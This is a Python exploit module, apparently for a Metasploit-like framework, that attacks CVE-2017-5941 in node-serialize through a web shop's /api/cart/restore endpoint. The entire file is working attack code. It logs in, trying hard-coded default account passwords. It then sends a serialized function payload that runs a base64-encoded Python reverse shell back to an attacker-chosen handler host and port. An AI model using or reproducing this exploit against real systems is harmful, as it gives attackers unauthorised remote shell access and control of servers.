#!/usr/bin/env python3
"""CVE-2017-5941 RCE via /api/cart/restore — ESM-safe import() payload."""
import base64
import http.client
import json
import time


META = {
    "name": "node_js_inject",
    "description": "CVE-2017-5941 RCE via node-serialize (ESM-safe import() payload)",
    "options": {
        "RHOST":    {"default": "127.0.0.1", "required": True, "desc": "Target host"},
        "RPORT":    {"default": 3001,        "required": True, "desc": "Target port"},
        "LOG_PATH": {"default": "/api/auth/login",   "required": True, "desc": "Login endpoint"},
        "SINK":     {"default": "/api/cart/restore", "required": True, "desc": "Eval sink endpoint"},
        "LHOST":    {"default": "127.0.0.1", "required": True, "desc": "Handler host"},
        "LPORT":    {"default": 4444,        "required": True, "desc": "Handler port"},
        "USER":     {"default": "boss",      "required": False, "desc": "Username"},
        "PASS":     {"default": "boss123",   "required": False, "desc": "Password"},
    },
}


def _http(method, host, port, path, body=None, headers=None, cookies=None, timeout=10):
    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    h = dict(headers or {})
    data = None
    if body is not None:
        data = json.dumps(body) if isinstance(body, (dict, list)) else body
        h.setdefault("Content-Type", "application/json")
    if cookies:
        h["Cookie"] = "; ".join(f"{k}={v}" for k, v in cookies.items())
    conn.request(method, path, body=data, headers=h)
    resp = conn.getresponse()
    raw = resp.read().decode(errors="replace")
    new_cookies = dict(cookies or {})
    for name, value in resp.getheaders():
        if name.lower() == "set-cookie":
            first = value.split(";", 1)[0].strip()
            if "=" in first:
                k, v = first.split("=", 1)
                new_cookies[k.strip()] = v.strip()
    conn.close()
    return resp.status, new_cookies, raw


def _login(rhost, rport, path, user, pw):
    for b in ({"username": user, "password": pw},
              {"identifier": user, "password": pw}):
        try:
            st, cookies, body = _http("POST", rhost, rport, path, body=b)
        except Exception:
            continue
        if st == 200:
            try:
                j = json.loads(body)
            except Exception:
                j = {}
            if j.get("ok") and cookies:
                return cookies
    return None


SEEDED = [("boss", "boss123"), ("manager", "manager123"), ("seller", "seller123")]


def _auth(rhost, rport, log_p, user, pw):
    if user and pw:
        c = _login(rhost, rport, log_p, user, pw)
        if c:
            return c, f"logged in as {user}"
    for u, p in SEEDED:
        c = _login(rhost, rport, log_p, u, p)
        if c:
            return c, f"logged in as {u}"
    return None, "no auth"


def _build_js(lhost, lport):
    py = (
        "import socket,subprocess,os;"
        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        f"s.connect(('{lhost}',{lport}));"
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        "subprocess.call(['/data/data/com.termux/files/usr/bin/sh','-i']);"
    )
    b64 = base64.b64encode(py.encode()).decode()
    cmd = f"python3 -c \"import base64;exec(base64.b64decode('{b64}'))\""
    # ESM-safe: dynamic import() instead of require()
    js = (
        f"(function(){{"
        f"import('child_process').then(function(cp){{cp.exec({json.dumps(cmd)});}});"
        f"return 'SENT';"
        f"}})()"
    )
    return js


def exploit(options):
    rhost = options["RHOST"]; rport = int(options["RPORT"])
    log_p = options["LOG_PATH"]; sink = options["SINK"]
    lhost = options["LHOST"]; lport = int(options["LPORT"])
    user  = options["USER"]; pw = options["PASS"]

    print(f"[*] Target: http://{rhost}:{rport}{sink}")
    print(f"[*] Callback: {lhost}:{lport}")
    print(f"[*] Handlers must be listening on {lport}")

    print("[*] Authenticating ...")
    cookies, msg = _auth(rhost, rport, log_p, user, pw)
    if not cookies:
        return False, msg
    print(f"[+] {msg}")

    print("[*] Building ESM-safe _$$ND_FUNC$$_ payload ...")
    js = _build_js(lhost, lport)
    blob = json.dumps({"cart": ["_$$ND_FUNC$$_" + js]})
    body = {"blob": blob}

    print(f"[*] JS size: {len(js)} bytes  blob size: {len(blob)} bytes")
    print(f"[*] POST {sink} ...")
    try:
        st, _, resp = _http("POST", rhost, rport, sink, body=body, cookies=cookies, timeout=15)
    except Exception as e:
        return False, f"POST failed: {e}"

    print(f"[*] Response: HTTP {st} ({len(resp)} bytes)")
    if resp:
        print(f"[*] Body: {resp[:300]}")

    time.sleep(2.0)
    return True, "Payload delivered. Check `sessions -l`."
